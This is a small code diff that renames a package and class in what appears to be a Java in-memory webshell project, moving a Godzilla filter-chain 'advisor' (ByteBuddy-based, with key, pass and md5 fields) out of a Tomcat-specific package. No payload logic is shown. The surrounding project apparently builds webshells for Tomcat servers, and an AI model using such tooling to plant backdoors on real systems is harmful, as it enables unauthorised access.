@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.tomcat.godzilla;
+package com.reajason.javaweb.memshell.shelltool.godzilla;
 
 import net.bytebuddy.asm.Advice;
 
@@ -15,7 +15,7 @@ import java.lang.reflect.Method;
 /**
  * @author ReaJason
  */
-public class TomcatFilterChainGodzillaAdvisor {
+public class GodzillaFilterChainAdvisor {
     public static String key;
     public static String pass;
     public static String md5;
